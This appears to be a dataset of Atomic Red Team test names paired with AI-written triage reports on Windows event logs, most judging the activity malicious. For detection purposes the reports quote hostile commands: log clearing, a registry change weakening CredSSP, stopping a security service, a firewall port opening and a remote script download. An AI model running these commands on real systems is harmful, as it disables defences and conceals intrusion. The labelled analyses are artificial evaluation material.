   - The `wevtutil.exe` command-line utility is used extensively. The command `wevtutil.exe cl` (clear log) is used for multiple logs by `SERVER002\admin_test`. This aligns with the log clearing events noted above.
   - The execution of `cmd.exe` with the command to modify Windows registry settings, specifically disabling toast notifications, is also suspicious. This action may indicate an attempt to avoid detection by suppressing visual notifications on the system.

3. **Sysmon Activity**:
   - Multiple instances of `svchost.exe`, which is a legitimate Windows process, run as `NT AUTHORITY\SYSTEM`. While this itself is normal, given the surrounding context of log clearing and registry manipulation, these entries could be further reviewed to see if they align with expected activity for services.

Overall, the combination of these actions suggests an attempt to obfuscate activities on the system, potentially indicating malicious behavior. Such actions, specifically the log clearing and registry modifications, can often be associated with malicious intent post-exploitation.

### Conclusion:
The observed activities in the Windows event logs highlight techniques commonly linked to malicious activities, particularly the log clearance by the user `admin_test` and the suspicious registry changes made by `cmd.exe` spawned by `wsmprovhost.exe`. Hence, my assessment is that these logs indicate **MALICIOUS** activity.

### Recommended Actions:
1. **Immediate Incident Response**: 
   - Isolate the system (Server002) from the network to prevent any lateral movement or further compromise.
   - Conduct a full forensic analysis on the host to determine the extent of the compromise, identify the vector of attack, and ascertain any data exfiltration.
   - Review recent user activity for the `admin_test` account and any other privileged accounts to assess potential misuse or compromise.

2. **Broader Investigation**:
   - Examine network logs for any suspicious or anomalous outbound connections from Server002 that could indicate communication with an attacker-controlled server.
   - Check for any signs of the incident in other systems in the environment, suggesting a larger-scale compromise.

3. **Mitigation Measures**:
   - Enhance monitoring and alerting on high-risk actions like event log clearing and registry modifications.
   - Review and strengthen access controls and audit logs regularly for key administrator accounts to detect any unauthorized access promptly."
Obfuscated Command in PowerShell,"Upon reviewing the provided Windows event logs, a few suspicious activities stand out, indicating potential malicious behavior. Here's a detailed analysis of the logs:

### Observations:
1. **Clearing of Event Logs:**
   - The System, Security, and Windows PowerShell event logs were cleared by the user ""admin_test"". This is captured in multiple logs:
     - The System log entry (EventID: 104) indicates the event logs were cleared by ""admin_test"".
     - The Security log entry (EventID: 1102) also shows the Security log was cleared. This behavior typically indicates an attempt to cover up previous actions, suggesting malicious intent.

2. **Suspicious PowerShell Activity:**
   - The Windows PowerShell log includes executed commands that are heavily obfuscated. These commands are typically indicative of malicious scripts aiming to execute complex behaviors while attempting to evade detection.
   - The Sysmon logs show the execution of the PowerShell process with highly obfuscated command lines. The obfuscation appears to involve a command that processes various integer values into characters, likely forming a payload or further instructions.

3. **Wevtutil.exe Execution:**
   - The execution of `wevtutil.exe` is noted multiple times in the Sysmon logs, which aligns with the clearing of logs using the command line (`""C:\\Windows\\system32\\wevtutil.exe"" cl <log>`) by ""admin_test"". This same user appears in multiple entries related to these actions.

### Assessment:
- **Log Clearing and PowerShell Obfuscation:** These activities are highly indicative of malicious actions. Clearing event logs is a known tactic to cover tracks, while executing obfuscated PowerShell commands suggests an attempt to perform unauthorized actions without detection.
- **Use of Wevtutil.exe:** This utility is legitimately used for managing event logs, but the context here implies its usage for processing malicious actions by cleaning logs of any abnormal traces.

### Conclusion:
Considering the combined evidence of log clearance, execution of obfuscated scripts, and the use of tools like `wevtutil.exe`, the activities within these logs are classified as:

**MALICIOUS**

### Guidance:
1. **Isolate the Affected System:** Disconnect the host from the network to prevent further propagation or data exfiltration.
2. **Conduct a Full Forensic Investigation:** Perform a deep dive into the system to understand the full extent of the compromise, focusing on artifacts left behind by the malicious PowerShell script.
3. **Reset Credentials:** As an immediate protective measure, reset credentials associated with the ""admin_test"" account and any other accounts suspected to have been affected.
4. **Implement Monitoring and Alerting:** Enhance logging and monitoring on all servers to detect similar patterns of behavior in the future.
5. **Patch and Update Systems:** Ensure that all systems are up-to-date with the latest security patches to prevent exploitation of known vulnerabilities.

This comprehensive approach will aid in addressing the identified security incident effectively."
WinPwn - UAC Bypass DccwBypassUAC technique,"**Detailed Analysis:**

1. **System and Security Logs:**
   - **Log File Clearance (Event ID 104 and 1102):** Several events indicate that logs from different channels (System, Windows PowerShell, Security) were cleared by the user ""admin_test"". This behavior is highly suspicious as clearing event logs is often an attempt to cover tracks by a user or malware activity.
   - **Time Manipulation (Event ID 4616, 24, 1):** The timestamps in the logs suggest a time rollback event. This could be normal system activity, but in conjunction with other suspicious events, it could indicate an attempt to interfere with log integrity or bypass time-based security measures.
   
2. **Windows PowerShell Logs:**
   - The execution of a PowerShell command to download and execute a script from ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1"" is extremely concerning. This type of activity is consistent with malware behavior or an unauthorized attempt to execute arbitrary scripts, potentially for privilege escalation or data exfiltration.

3. **Sysmon Logs:**
   - **Command Line Utility Execution:** The execution of `wevtutil.exe` to clear event logs (""cl"" command) seen multiple times for different logs by ""admin_test"", this user account seems to be dedicated to suspicious activities. This reinforces the log clearing attempts as intentional and potentially malicious.
   - **Unauthorized PowerShell Execution (Process Creation Events):** The execution of PowerShell in an unusual context and command line as seen in the Sysmon logs further confirms unauthorized and potentially harmful activity on the host system.
   
4. **Application Log:**
   - The application log itself does not provide additional suspicious information directly linked to potential malicious activities beyond indicating normal operational status changes.

**Assessment:**

Given the combination of:
- The execution of suspicious PowerShell commands aimed at downloading external scripts.
- Repeated clearing of system, security, and PowerShell logs.
- Abnormal host time adjustments potentially aimed at disrupting log integrity.
  
These events collectively provide strong indicators of potentially malicious activities aimed at compromising the integrity and security of the host.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Isolation:** Disconnect the affected host from the network to prevent further spread or data exfiltration.
2. **User Account Investigation:** Review activities associated with the ""admin_test"" account and other privileged accounts. Verify their legitimacy and check for unauthorized access.

InstallUtil Install method call,"### Analysis

Upon analyzing the provided logs, several indicators of potentially malicious activities have been identified:

1. **Clearing of Event Logs**:
    - Security Log: EventID 1102 indicates that the security event log was cleared by the user `admin_test` on `2024-10-26 13:31:51`. 
    - System Log: EventID 104 confirms the clearing of the system log by the same user at similar timestamps for both the System and Windows PowerShell channels.

2. **Suspicious PowerShell Activity**:
    - Multiple PowerShell events indicate execution of a script from a temporary directory (`AtomicRedTeam\T1218.004\src\InstallUtilTestHarness.ps1`).
    - The script imports and executes a DLL file, which is typically used in testing scenarios by the Atomic Red Team but also could indicate an attempt to bypass security measures using known techniques.
    - The command line used includes `InstallUtil.exe`, a known masquerading binary used for malicious activities.

3. **Use of `wevtutil` to Clear Logs**:
    - Sysmon logs show execution of `C:\Windows\System32\wevtutil.exe` with parameters indicating the clearing of various event logs, which coincides with the timestamps of log-clearing events in other logs. This indicates an attempt to cover tracks by the same `admin_test` account.

4. **High Integrity Levels**:
    - The integrity level associated with these events is ""High"", suggesting that these actions were performed with elevated privileges, which is often required for malicious activities such as log clearing.

5. **Behavioral Analysis**:
    - The combination of PowerShell script execution with potentially malicious DLL usage, log clearance, and elevated access privileges matches known attack vectors involving persistence and evasion techniques.

### Assessment

Based on the above indications, the activities evidenced in the logs strongly suggest an attack pattern that is behaviorally consistent with known malicious actions. The clearing of logs, use of PowerShell with unusual scripts and potential Reflective DLL Injection through `InstallUtil` are significant red flags for post-exploitation activities.

### Resolution

- **MALICIOUS**: The logs present clear indicators of malicious behavior. Immediate containment and remediation actions should be taken. This includes:
  - Isolating the host `Server002` from the network.
  - Conducting a thorough forensic investigation to identify any further lateral movements or persistence mechanisms.
  - Reviewing all accounts for unauthorized changes and resetting passwords for affected services and accounts.
  - Strengthening logging and monitoring to detect similar activities in the future.

These steps are critical to safeguard against further compromises and to prevent similar incidents from occurring."
Scarab Ransomware Defense Evasion Activities,"After analyzing the provided Windows event logs from the ""Server002"" machine, I have identified several suspicious behaviors that may indicate potential malicious activity.

### Analysis:

1. **Event Log Clearing:**
   - The Security event log ID 1102 indicates that logs have been cleared by a user named ""admin_test"" (EventRecordID 30348). Log clearing can be a tactic used by attackers to cover their tracks after illicit activity, particularly when logs are cleared without legitimate reasons.

2. **Time Change:**
   - Security event log ID 4616 indicates multiple time change events on the system at 2024-10-24 17:50:58. This rapid time change, repeated twice in quick succession, is unusual and could be a sign of attempts to manipulate timestamps for evasion or data consistency issues across other logging systems.

3. **Privilege Use:**
   - Event ID 4672 in Security logs shows that the user ""admin_test"" utilized multiple high-level privileges such as SeBackupPrivilege, SeRestorePrivilege, and SeDebugPrivilege. It is unusual for such extensive privileges to be exercised without a documented maintenance window or reason.

4. **Process Execution:**
   - Sysmon Event ID 1 logs reveal multiple “wevtutil.exe” executions attempting to clear different event logs (e.g., Security, System, Application) at 2024-10-24 17:51:01. Clearing logs through “wevtutil” is not common for regular operations and could indicate malicious intent to erase footprints.
   - The command `""cmd.exe"" /c reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f` adds a registry key potentially lowering security settings for CredSSP, an action that might be used to facilitate remote code execution or weaken security.

5. **Process Parent-Child Relationships:**
   - The analysis of Sysmon logs shows a command line utility using the parent process `wsmprovhost.exe`, predominantly associated with Windows Remote Management, which may be exploited if misconfigured or hijacked by adversaries.

### Assessment:
Based on the evidence, the activity observed in the logs points towards potentially **malicious** behavior. The combination of event log clearing, registry modifications with `reg.exe`, high privilege utilization, and unusual time changes are strong indicators of compromise activities aiming to obscure unauthorized actions on the system.

### Resolution:
**MALICIOUS** - The actions identified in the logs suggest that unauthorized and potentially harmful activities occurred which should be investigated thoroughly.

### Guidance:
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further potential malicious activity.
   - Perform a comprehensive review of user privileges, especially the ""admin_test"" account, to ensure they are minimally necessary for business operations.

2. **Remediation:**
   - Restore system and security configurations to known secure states, reviewing any compromised entities such as registry keys and executable settings.
   - Thoroughly scan the system for malware or unauthorized software.
   - Forensic analysis should be conducted to ascertain the full scope and impact of the breach.

3. **Future Prevention:**
   - Enhance logging and monitoring to capture indicative actions with broader coverage and storage solutions to prevent log clearing from obscuring vital data.
   - Regularly review and audit time settings, logging configurations, and privilege assignments adhering to least privilege principles."
Opening ports for proxy - HARDRAIN,"After analyzing the provided log entries, several suspicious activities can be identified:

1. **Clearing Event Logs:**
   - In both the Security and System logs, there are entries indicating that logs were cleared by the user ""admin_test"" (Event ID 1102 in Security log and Event ID 104 in System log). This is suspicious behavior as it is often used as a step to cover tracks after malicious activity.

2. **Frequent Usage of Wevtutil:**
   - There are multiple instances of the `wevtutil.exe` command-line utility being executed to clear logs on different channels (e.g., Microsoft-Windows-Sysmon/Operational, Application, Security). While `wevtutil.exe` is a legitimate Windows utility for managing Event Logs, its repeated and sequential use in a single session, especially with commands purposed to clear logs (`cl` command), enhances the suspicion.

3. **Modifying Firewall Rules:**
   - The log `cmd.exe` is used together with `netsh.exe` to add a new inbound firewall rule allowing traffic on TCP port 450. This action could potentially open the system to unauthorized access and is indicative of adversarial activities attempting to bypass network security settings.

4. **Time Change Events:**
   - There are entries indicating changes in system time settings. While it's not uncommon for time adjustments to occur, if this action is unauthorized or unexplained, it could be used to synchronize attacks or obfuscate log timelines. However, no evidence suggests this was exploited for such purposes in this instance.

5. **Process Execution with High Integrity Level:**
   - Every suspicious activity, including the running of command-line utilities, is being executed with high integrity by the user ""admin_test"". This suggests potential privilege misuse or compromise of an elevated account.

Given these analyzed factors, the activities witnessed in the provided set of logs do not align with typical benign usage patterns. The combination of log clearing, firewall modifications, and the use of administrative utilities strongly suggests these actions are orchestrated to obfuscate malicious activities or facilitate unauthorized operations on the system.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- Immediately investigate the account ""admin_test"" to determine its legitimacy and check for potential compromises.
- Conduct a forensic investigation to determine the extent of unauthorized access and changes made to the system.
- Reinstate logging and audit settings to ensure additional activities are captured.
- Review access controls and improve monitoring of elevated privilege accounts.
- Consider resetting credentials and re-evaluating security policy configurations to prevent similar occurrences."

1. **Event Log Clearing:**
   - The Security log contains an event with EventID 1102, indicating that the logs were cleared by the user `admin_test`. Clearing event logs is often a tactic used by attackers to cover their tracks.
   - The System log also shows EventID 104, which indicates the clearing of logs for the System and Windows PowerShell channels by the same user, `admin_test`. This behavior is suspicious as it hides any potentially malicious activity that occurred prior to the logs being cleared.

2. **Unexpected Command-Line Activity:**
   - The Sysmon logs depict a series of executed processes. Notably, there is an execution of `cmd.exe` with a complicated command line involving registry queries and the potential for remote document opening (`ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx`), which could indicate an attempt to execute a Living-Off-the-Land (LOtL) technique or a potentially malicious action. 
   - The usage of PowerShell, `whoami.exe`, `hostname.exe`, and `wevtutil.exe` reflects a series of enumeration or system commands. While such commands can be benign when executed for legitimate administrative purposes, in the context of cleared logs and suspicious cmd lines, they contribute to the overall suspicious nature of the activities.

3. **Process Execution:**
   - Numerous entries of legitimate-looking processes related to Microsoft Edge Update are observed. While these could typically be benign, they occur in conjunction with suspicious log clearing and potentially harmful command line operations.

4. **Log Context and Timing:**
   - The timing of the events shows a sequence where logs were cleared, and soon after, there are several executions of various command-line utilities (`cmd.exe`, `reg.exe`, etc.) by the user `admin_test`.

**Assessment:**
- The combination of cleared logs, suspicious command-line activities, and execution of multiple utilities align with tactics, techniques, and procedures (TTPs) often associated with malicious activity. These patterns suggest an attempt to maintain persistence or further exploitation, while also covering tracks by clearing logs.

**Resolution:**
- **SUSPICIOUS** - The logs contain activities that appear out of character or unexpected and warrant further investigation to determine if they are indeed malicious or if there is a legitimate explanation for the actions observed.

**Guidance:**
- Conduct a thorough investigation into the user activity by interviewing or gathering more context regarding `admin_test` operations during the time of these events.
- Review any available backups or systems to capture evidence from a time before the logs were cleared.
- Use additional forensic tools to analyze the disk and memory to uncover any artifacts left by potential malicious activities.
- Consider enhancing monitoring and logging practices to prevent future unauthorized log clearing."
Bypass UAC using sdclt DelegateExecute,"Based on the analysis of the provided log entries, I have identified several events that indicate potential malicious activity:

1. **Security Log:**
   - **Event ID 1102:** This event indicates the security log was cleared by the user `admin_test`. Clearing event logs is a known tactic used by attackers to cover their tracks after performing malicious activities. 
   - **Event ID 4624 and 4672:** These events show a logon and special privileges being assigned to the `SYSTEM` user, potentially indicating privilege escalation or process impersonation.

2. **Windows PowerShell Log:**
   - **Event ID 600:** There are multiple instances of a PowerShell command being executed that involves creating items in the registry and launching `notepad.exe` via `cmd.exe`, possibly indicating an attempt at persistence or execution of unauthorized commands. The use of `sdclt.exe` in conjunction with PowerShell suggests a UAC (User Account Control) bypass attempt.
   
3. **Sysmon Log:**
   - Multiple events involving `wevtutil.exe` with the `cl` (clear) command, clearing logs from `Security`, `System`, and `Windows PowerShell` channels reinforce the indication that logs were deliberately cleared.
   - **Event IDs involving `powershell.exe`:** These indicate execution of PowerShell in a manner consistent with launching malicious or unauthorized scripts, aligning with observations from the PowerShell log.

### Conclusion:
Considering the clearing of logs (Event ID 1102) by `admin_test`, privilege escalation activities to `SYSTEM`, execution of potentially malicious PowerShell scripts, and Sysmon logs supporting tampering and unauthorized executions, these activities are highly indicative of malicious behavior.

**Final Assessment: MALICIOUS**

### Recommended Actions:
1. **Immediate Incident Response:**
   - Isolate the affected host `Server002` to prevent further potential compromise within the network.
   - Conduct memory and disk forensics on the isolated host to gather additional evidence of the activity.
   - Review user activities for `admin_test` and ensure the account is legitimate; consider changing its password or disabling it temporarily.
   
2. **Remediation:**
   - Restore the host from a clean backup prior to the event timestamps.
   - Verify the integrity of other systems within the network to ensure no lateral movement occurred.
   - Implement enhanced monitoring of administrative activities and PowerShell executions.

3. **Hardening and Monitoring:**
   - Implement stricter policies to prevent unauthorized changes to log entries and ensure that logging is protected.
   - Regularly review logs for unusual activities.
   - Enable script block logging and module logging for PowerShell to monitor suspicious command-line activities."
MSXSL Bypass using local files,"Upon reviewing the provided Windows event logs, several indicators suggest suspicious and possibly malicious activities:

1. **Event Log Clearing:**  
   - Multiple instances of event log clearing are observed. This is evident from:
     - Security Log (EventID 1102)
     - Sysmon Log (e.g., for processes like `wevtutil.exe` clearing logs)
     - System Log (EventID 104 for clearing System and Windows PowerShell logs).
   - Clearing of event logs is a common tactic used by attackers to cover their tracks.

2. **Unusual Use of System Tools:**  
   - The use of `wevtutil.exe` to clear logs (as seen in the Sysmon logs) associated with the user `admin_test`, which is a strong indicator of an attempt to cover tracks after potentially illicit actions.
   - Additional suspicious processes like `powershell.exe` without detailed command lines, which can often be used for malicious scripting.

3. **Execution of Known Malicious Frameworks:**
   - The presence of `cmd.exe` executing with the command line that involves files from ""AtomicRedTeam"", a known penetration testing framework, suggests simulated attacks or tests without notification. These frameworks are often used for adversary simulation and, if not sanctioned, could indicate malicious reconnaissance or exploitation attempts.

4. **High-Privilege Activities:**
   - There are multiple EventID 4672 logs indicating the assignment of high privileges to `SYSTEM`, such as `SeDebugPrivilege` and others. While normal for some operations, within the context of these logs, it might contribute to suspicious behavior, especially when associated with log clearing.

5. **Credential Access Attempts:**
   - Several EventID 5379 indicate unsuccessful attempts to read credentials associated with a `MicrosoftAccount` user. These could signify attempted unauthorized access or credential harvesting efforts.

### Assessment:
The activities logged indicate suspicious behavior with elements consistent with malicious intent, particularly due to the covering of tracks via log clearing, and the use of penetration testing tools without context suggesting it's a legitimate security test or exercise. 

### Threats or Risks Identified:
- **Log Cleansing:** Indicates potential malicious actions followed by attempts to cover the tracks.
- **Use of System Tools:** The execution of `wevtutil.exe` and PowerShell in this context is likely an indicator of advanced persistence techniques.
- **Potential Unauthorized Access:** Given attempts to access a MicrosoftAccount and use of a testing tool, there's a risk of credential compromise or lateral movement.

### Guidance:
- **Enhance Monitoring:** Implement additional logging and monitoring solutions to detect and alert on similar suspicious activities.
- **Conduct a Full Forensic Investigation:** Evaluate system changes, and if possible, obtain memory dumps for deeper analysis of potential malware in memory.
- **Review Access Controls:** Evaluate the activities performed by `admin_test` and validate whether these actions were sanctioned.
- **Incident Response:** Depending on the findings of further investigation, consider isolating affected systems and initiating incident response procedures.

### Resolution:
**MALICIOUS:** The logs contain activities that strongly indicate malicious behavior, including log tampering, potential credential access attempts, and execution of frameworks typically used for malicious simulations without consent."
CMSTP Executing UAC Bypass,"### Analysis:

Upon reviewing the provided Windows event logs from **Server002**, there are multiple indicators of potentially malicious behavior:

1. **Event Log Clearing (System Event ID 104) and Security Event ID 1102**:
   - The `admin_test` user cleared the System and PowerShell logs (Event ID 104). 
   - The Security log was also cleared around the same time (Event ID 1102). 
   - Log clearing is often considered highly suspicious because it can be an attempt to hide malicious activities.

2. **Suspicious Command Execution (Sysmon Events)**:
   - Multiple executions of `wevtutil.exe cl` command across different logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""Security"", and ""Windows PowerShell"". This command is used to clear event logs, which aligns with the clearing observed in the System and Security logs.
  
3. **Potential Privilege Escalation**:
   - The capture of `cmd.exe` executing `cmstp.exe` with `/au` switch, which is indicative of a potential UAC bypass attempt via ""CMSTP"" that is known for its misuse in bypassing UAC protections. This switch is suspicious as it typically isn’t used in regular administrative tasks.
   - Usage of `PowerShell.exe` by `admin_test` near the same time logs were cleared also merits further examination for unauthorized scripts being executed.

4. **Privileged Logon Session and Elevated Privileges**:
   - Event ID 4672 indicates assignment of powerful privileges including `SeDebugPrivilege`, `SeTcbPrivilege`, and others typically unnecessary for standard operations without context.
   - Event ID 4624 logon using NTLM with high privileges logged with type 3 (network logon) suggests potential lateral movement.

5. **Edge Update and Other Process Creation Activities**:
   - Frequent creation of processes related to Microsoft Edge Update could indicate legitimate software updates, however, when paired with the above context, it might either be a decoy or irrelevant without further context from the environment which should be monitored.

### Assessment:
Based on the actions of event log clearing, abnormal administrative commands indicative of privilege escalation attempts, and multiple elevated privilege assignments, this behavior aligns with known techniques attackers use when attempting to escalate privileges and cover their tracks.

### Resolution:
**MALICIOUS** - The evidence of log clearing, potential UAC bypass, and suspicious logons strongly suggests malicious activity intended to hide unauthorized actions on the system.

### Guidance:
1. **Immediate Actions**:
   - Investigate and verify any recent changes or authorized reasons for these actions by `admin_test`.
   - Review user access and permissions for `admin_test` to determine if any unauthorized access occurred.
  
2. **Containment and Remediation**:
   - Isolate Server002 to ensure no further spread or actions can occur.
   - Conduct a thorough investigation to pinpoint what additional malicious actions were taken and any data or systems affected.
   - Consider restoring from a known good backup prior to this event if integrity was compromised.

3. **Monitoring and Prevention**:
   - Increase the monitoring of privileged accounts and create alerts for log clearing and commands similar to `cmstp.exe` usage.
   - Deploy endpoint detection and response tools to actively monitor for suspicious command-line activity.
   - Enforce stronger log retention and monitoring policies to prevent unauthorized log loss.

In summary, the evidence points to potential system compromise on Server002 requiring immediate investigation and possible system restoration and monitoring adjustments post-recovery."
Remove Network Share PowerShell,"Upon reviewing the provided Windows event logs, several activities raise concerns about potential malicious activity:

1. **Deletion of Event Logs**: The logs show multiple instances of the `wevtutil.exe` process executing log clearing commands across different channels, including the System, Application, Security and Windows PowerShell channels. These actions are typically associated with attempts to cover tracks after potential unauthorized or malicious activity (Sysmon EventID 1 showing `wevtutil.exe` clearing logs).

2. **Unauthorized PowerShell Activity**: PowerShell logs indicate a command to remove shared folders using `Remove-SmbShare` and `Remove-FileShare`. This activity could be an indication of an attempt to disrupt services or remove evidence from the network (PowerShell Events showing execution of commands with `Remove-SmbShare`).

3. **Log Inspections and Clearing by Non-System Processes**: The `admin_test` user is shown clearing logs, which is unusual unless it is part of a maintenance procedure or troubleshooting step. However, combined with other suspicious activities, it raises red flags.

4. **Windows PowerShell Execution**: The logs show the execution of suspicious scripts that include removal of shared drives, which can indicate unauthorized administrative actions (Windows PowerShell EventLog 1043).

5. **Time Change Events**: The logs show a few instances where the system time was changed (`Security log EventID 4616` and `System log EventID 1`). Time changes in logs often help attackers align logs with respective actions to obscure evidence of activities.

6. **Log File Cleared Event**: Security Event ID 1102 indicates that the security log was cleared. This is a critical event that should not occur regularly, as it suggests attempts to hide malicious or unauthorized activities.

Overall, given the combination of log clearing, execution of suspicious PowerShell commands, and potential disruptive actions identified in the logs, the logs indicate potential malicious activity.

**Assessment**: MALICIOUS - The log entries point towards techniques frequently associated with malicious activity, such as log clearing to cover tracks, suspicious PowerShell execution to manipulate file shares, and time change events that may further obfuscate activities.

**Guidance on how to proceed**:
1. Immediate containment of the affected systems should be initiated to prevent further unauthorized actions.
2. A full forensic analysis should be performed to understand the full scope of the attack and any further potential compromises within the network.
3. Monitor network traffic and establish additional logging for other systems to investigate potential lateral movement.
4. Reset passwords for accounts potentially compromised, particularly the `admin_test` user.
5. Review access controls and ensure auditing is appropriately configured to detect similar activities in the future.
6. Depending on the findings, law enforcement might need to be contacted if unauthorized access or data breaches are confirmed."
Stop and Remove Arbitrary Security Windows Service,"Upon reviewing the provided Windows event logs, several potentially suspicious activities were identified. Below, I present a detailed analysis of the key findings:

### Security Log:

1. **Event ID 1102** - The event log was cleared by the user ""admin_test"" at 08:43:00. This action is often associated with attempts to cover tracks and is considered a strong indicator of malicious activity if performed without a legitimate administrative task requiring it.

### Sysmon Log:

1. **Event ID 1** - Process creation log entries involving `wevtutil.exe` with command-line arguments that clear event logs: `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`, `""C:\\Windows\\system32\\wevtutil.exe"" cl System`, and `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`. These actions correspond to the event log clearing and are commonly associated with malicious attempts to hide activities.

2. **Event ID 1** - A PowerShell instance was executed using the command line to stop and remove the McAfee DLP Agent Service: `powershell.exe & {Stop-Service -Name McAfeeDLPAgentService, Remove-Service -Name McAfeeDLPAgentService}`. This behavior is suspicious as it disables an endpoint protection mechanism, which fits common tactics used by malware to disable security protections.

### Windows PowerShell Log:

1. **Event ID 600 & 403** - PowerShell command execution showing attempts to stop and remove the McAfee DLP Agent Service illustrates an intention to disable security defenses on the host.

### Indicators of Compromise:

- The clearing of event logs is notably performed close to the execution of scripts meant to disable security services. 
- The PowerShell command was executed from a temporary directory and contains commands typically seen in attempts to neutralize host-based security solutions.

### Assessment:

The combination of these log entries strongly suggests unauthorized and malicious activity. The act of clearing event logs, coupled with executing commands to disable a DLP service through PowerShell, highlights a clear sequence of actions taken to compromise the host's integrity and evade detection.

### Resolution:

- **MALICIOUS** - The logs contain activity indicative of malicious intent and actions, including event log manipulation and security feature disabling. Immediate steps should be taken to contain and remediate the potential compromise, including isolating the affected host from the network, performing a detailed forensic analysis, and implementing alerts and defenses to prevent recurrence.

### Guidance:

1. **Isolate** the affected machine from the network to prevent further spread or data exfiltration.
2. **Conduct a forensic investigation** to ascertain the extent of the compromise and gather intelligence on potential malware or adversaries involved.
3. **Review all accounts** and privileges, especially the activities of ""admin_test,"" to ensure no further unauthorized access is possible.
4. **Enhance monitoring** and host-based defenses to detect similar patterns in the future as part of a proactive threat hunting approach.
5. **Patch vulnerabilities** and ensure all endpoint protection solutions are up-to-date and configured to resist similar tactics."
Activate Windows NoSetTaskbar Group Policy Feature,"After a thorough analysis of the provided event logs, several activities stand out as potential indicators of malicious activity:

1. **Security Logs Examination**:
   - An entry with Event ID 1102 indicates that the security log was cleared (`LogFileCleared`). This event is typically related to malicious activity because attackers often attempt to hide their tracks by clearing event logs. This event was triggered by the user `admin_test`.

2. **Sysmon Logs Examination**:
   - Multiple executions of `wevtutil.exe` with different command-line arguments to clear logs (`cl`) for `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. This aligns with typical evasion techniques used by attackers to remove traces of their activities.
   - The execution of `cmd.exe` with a command to modify the Windows Registry (`reg add`) under user `admin_test`. This activity directly corresponds with attempts to alter system behavior, such as disabling taskbar settings, potentially signifying unauthorized modification.
   - Use of `whoami.exe` and `hostname.exe` which are often seen in reconnaissance activities to gather information about the system identity and network.

3. **System Logs Examination**:
   - Log entries with Event ID 104 indicate that system and Windows PowerShell logs were cleared. As with the security log, this behavior is associated with attempts to conceal potentially unauthorized actions.

4. **Edge Update Activity**:
   - While there are numerous entries relating to Microsoft Edge Update processes, these appear to be legitimate system updates and lack indicators of compromise.

Overall, the combination of clearing multiple logs, executing command-line utilities to modify registry settings, and using system information-gathering commands suggests a concerted effort to conceal potentially malicious actions and modify system configurations.

**Assessment**: The logs contain activities indicative of malicious intent, revolving around log clearing and unauthorized registry modifications.

**Resolution**: MALICIOUS

**Guidance**:
- **Immediate Incident Response**: Engage your incident response team to contain and investigate the Server002 system.
- **Forensic Analysis**: Preserve and analyze memory and disk to uncover any additional indicators and payloads.
- **Review User Accounts**: Evaluate the `admin_test` account for unauthorized access and disable any uncovered illegitimate accounts.
- **Strengthen Security Controls**: Consider implementing better log auditing and retention policies to detect and prevent log tampering, and ensure all patches and updates are applied.
- **User Education**: Conduct training to raise awareness about log-related activities and endpoint security practices."
Indicator Manipulation using FSUtil,"Upon analyzing the provided Windows event logs, several observations and concerns exist that shed light on potential malicious activities:

1. **Security Log (Event ID 1102 & 104):** These events indicate that the logs were cleared on the system (""LogFileCleared"" event). Log clearing is a known tactic often associated with malicious activities to hide traces of unauthorized actions. The user ""admin_test"" is responsible for clearing the System, Security, and Windows PowerShell logs. This is a major red flag and suggests attempts to obfuscate activities on the system.

2. **Sysmon Events (Process Execution):**
   - The sequence of executed processes, particularly PowerShell, FSUTIL, and WEVTUTIL utilities, suggests activities that could be part of a penetration testing or a genuine malicious attempt:
     - PowerShell scripts interacting with files in ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam..."" may indicate testing or use of known adversary simulation tools like Atomic Red Team, which could either be legitimate usage for security testing or mimicry of malicious tactics.
     - FSUTIL is used to interact with file systems, potentially altering or clearing file data, which is suspicious depending on the context.
     - WEVTUTIL is used to clear event logs, further evidencing potential malicious intent.
   
3. **Use of Privileges (Event ID 4672):** The ""admin_test"" user account had elevated privileges including SeDebugPrivilege and SeSecurityPrivilege, both of which can be misused for malicious purposes. The presence of high integrity levels in processes is consistent with this observation.

4. **Sysmon Log (PowerShell Activity):** The PowerShell activity involves executing commands that create and alter files in a temporary directory. This is often seen in scenarios involving scripts aimed at evasion or maintaining a foothold on the system.

5. **Compromised or Suspicious Files/Commands:**
   - The registry, filesystem, and other PowerShell providers starting in conjunction with specific operations using FSUTIL and WEVTUTIL is highly indicative of potential malicious activities aimed at data manipulation or log alteration.
   
Based on the collective evidence from the Windows event logs, the following assessment and resolution can be provided:

**Assessment:**
- The presence of log clearing activities combined with the creation and modification of files using PowerShell and FSUTIL by a user with elevated privileges strongly indicates potential malicious activity.
- Although there's a possibility of these actions being part of legitimate security tests, the direct clearing of logs without backup is suspicious and is often associated with activities aimed at evading detection.

**Resolution: MALICIOUS**

**Guidance:**
- Conduct a thorough forensic investigation to determine the extent of the intrusion and identify all possible affected areas.
- Verify the legitimacy of the ""admin_test"" account use and assess if it aligns with organizational norms for administrative activities.
- Re-examine the integrity and security measures around your log management and privileged access controls.
- Consider restoring logs from backup and increasing the monitoring of similar activities to prevent future incidents."

#### Suspicious and Anomalous Behavior Observed:
1. **Use of `wevtutil.exe` to Clear Event Logs:**
   - Several instances of `wevtutil.exe` with the command lines mentioning `""cl""` for clearing logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `""Windows PowerShell""`).
   - Clearing event logs is a common technique to hide malicious activity.

2. **Command Execution with High Integrity Level:**
   - Execution of commands with high integrity levels, such as `wevtutil.exe` and other utilities, indicates potential privilege escalation or malicious intent due to the sensitive nature of log manipulation.
   
3. **Installation of MSI from Remote Resource:**
   - The command execution involving `msiexec.exe` to install JScript from a URL associated with a known attack simulation platform (Atomic Red Team). This is consistent with the execution of T1218.007, a known MITRE ATT&CK technique for signed MSI execution.
   
4. **Use of PowerShell:**
   - PowerShell was executed with `-nop` and a command to write to the host. The use of `-nop` (no profile) and direct commands is often associated with attempts to evade detection while executing scripts.
   
5. **Event 1102 from Security Log:**
